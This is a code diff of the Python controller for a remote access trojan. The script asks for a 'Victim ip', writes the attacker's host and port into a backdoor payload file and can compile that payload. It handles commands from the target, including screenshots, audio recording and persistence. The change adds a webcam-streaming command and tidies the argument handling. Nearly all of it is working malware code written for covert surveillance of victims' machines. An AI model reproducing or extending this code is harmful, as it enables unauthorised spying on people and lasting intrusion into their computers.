@@ -18,21 +18,23 @@ ap.add_argument("-rh", "--rhost", required=True, help="Victim ip")
 ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
 ap.add_argument("-p", "--port", required=True, help="Port")
 ap.add_argument("-c", "--compile", action="store_true", required=False, help="Compiler payload file")
-args = vars(ap.parse_args())
+args = ap.parse_args()
 
-if args['lhost']:
-    LHOST = str(args['lhost'])
-if args['rhost']:
-    RHOST = str(args['rhost'])
-if args['port']:
-    PORT = int(args['port'])
+if args.lhost:
+    LHOST = str(args.lhost)
+if args.rhost:
+    RHOST = str(args.rhost)
+if args.port:
+    PORT = int(args.port)
 
 
 def modify_backdoor():
     file = open('backdoor.py')
     _content = file.readlines()
     for i, line in enumerate(fileinput.input('backdoor.py', inplace=1)):
-        sys.stdout.write(line.replace(_content[29], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
+        sys.stdout.write(line.replace(_content[24], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
+
+
     print(termcolor.colored("[+] Modifying backdoor file", 'green'))
 
 
@@ -77,6 +79,7 @@ def target_reqs():
         reliable_send(cmd)
         if cmd == 'exit':
             print(termcolor.colored('[-] Goodbye', 'red'))
+            reliable_send("exit")
             break
         elif cmd == 'help':
             print(termcolor.colored("""
@@ -125,7 +128,8 @@ def target_reqs():
                     break
             target.settimeout(None)
             f.close()
-            os.replace("screenshot%d.png" % count, "images/screenshot%d.png" % count)
+            os.replace("screenshot%d.png" %
+                       count, "images/screenshot%d.png" % count)
             count += 1
             print(termcolor.colored('[+] Done screenshot saved', 'green'))
         elif cmd[:6] == 'record':
@@ -141,7 +145,8 @@ def target_reqs():
                     break
             target.settimeout(None)
             f.close()
-            os.replace("recorded%d.wav" % count, "recordings/recorded%d.wav" % count)
+            os.replace("recorded%d.wav" %
+                       count, "recordings/recorded%d.wav" % count)
             count += 1
             print(termcolor.colored('[+] Done recorded file', 'green'))
 
@@ -152,6 +157,13 @@ def target_reqs():
                 print(termcolor.colored('[+] Done', 'green'))
             else:
                 print(termcolor.colored('[-] Wrong command', 'red'))
+        elif cmd[:6] == 'webcam':
+            if cmd[7:] == 'on':
+                print(termcolor.colored(f'[+] Go to http://{RHOST}/:5000', 'green'))
+            elif cmd[7:] == 'off':
+                print(termcolor.colored('[+] Done', 'green'))
+            else:
+                print(termcolor.colored('[-] Wrong argument', 'red'))
 
         elif cmd[:11] == 'persistence':
             log = reliable_recv()
@@ -169,13 +181,13 @@ def target_reqs():
 
 
 modify_backdoor()
-
-if args.show == True:
-    py_compile.compile("backdoor.py")
-    print(termcolor.colored("[+] Finished compiling", 'green'))
-    print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
+if args.compile == True:
+    try:
+        py_compile.compile("backdoor.py")
+        print(termcolor.colored("[+] Finished compiling", 'green'))
+        print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
     except py_compile.PyCompileError:
-        print(termcolor.colored("[+] Error: can not compile :-(",'red'))
+        print(termcolor.colored("[+] Error: can not compile :-(", 'red'))
 
 skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 skt.bind((RHOST, PORT))
